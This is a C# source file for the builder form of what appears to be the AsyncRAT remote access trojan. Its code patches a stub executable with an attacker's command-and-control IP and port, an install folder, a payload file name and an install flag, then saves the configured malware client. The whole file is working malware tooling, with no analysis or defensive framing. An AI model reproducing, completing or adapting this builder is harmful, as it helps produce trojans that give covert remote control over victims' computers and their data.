using System;
using System.Linq;
using System.Windows.Forms;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using System.IO;

namespace AsyncRAT_Sharp.Forms
{
    public partial class Builder : Form
    {
        public Builder()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {

            if (string.IsNullOrWhiteSpace(textIP.Text) || string.IsNullOrWhiteSpace(textPort.Text)) return;
            if (checkBox1.Checked)
            {
                if (string.IsNullOrWhiteSpace(textFilename.Text) || string.IsNullOrWhiteSpace(comboBoxFolder.Text)) return;
                if (!textFilename.Text.EndsWith("exe")) textFilename.Text += ".exe";
            }

            try
            {
                var md = ModuleDefMD.Load(Path.Combine(Application.StartupPath, "Stub.exe"));
                foreach (TypeDef type in md.Types)
                {
                    if (type.Name == "Settings")
                        foreach (MethodDef method in type.Methods)
                        {
                            if (method.Body == null) continue;
                            for (int i = 0; i < method.Body.Instructions.Count(); i++)
                            {
                                if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                {
                                    if (method.Body.Instructions[i].Operand.ToString() == "127.0.0.1")
                                        method.Body.Instructions[i].Operand = textIP.Text;

                                    if (method.Body.Instructions[i].Operand.ToString() == "6606")
                                        method.Body.Instructions[i].Operand = textPort.Text;

                                    if (method.Body.Instructions[i].Operand.ToString() == "%AppData%")
                                        method.Body.Instructions[i].Operand = comboBoxFolder.Text;

                                    if (method.Body.Instructions[i].Operand.ToString() == "Payload.exe")
                                        method.Body.Instructions[i].Operand = textFilename.Text;

                                    if (method.Body.Instructions[i].Operand.ToString() == "Payload.exe")
                                        method.Body.Instructions[i].Operand = textFilename.Text;

                                    if (method.Body.Instructions[i].Operand.ToString() == "false")
                                        method.Body.Instructions[i].Operand = checkBox1.Checked.ToString();
                                }
                            }
                        }
                }

                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
                saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
                saveFileDialog1.InitialDirectory = Application.StartupPath;
                saveFileDialog1.OverwritePrompt = false;

                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    md.Write(saveFileDialog1.FileName);
                    MessageBox.Show("Done", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    this.Close();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                checkBox1.Text = "ON";
                textFilename.Enabled = true;
                comboBoxFolder.Enabled = true;
            }
            else
            {
                checkBox1.Text = "OFF";
                textFilename.Enabled = false;
                comboBoxFolder.Enabled = false;
            }
        }

        private void Builder_Load(object sender, EventArgs e)
        {
            comboBoxFolder.SelectedIndex = 0;
            textPort.Text = Settings.Port.ToString();
        }
    }
}
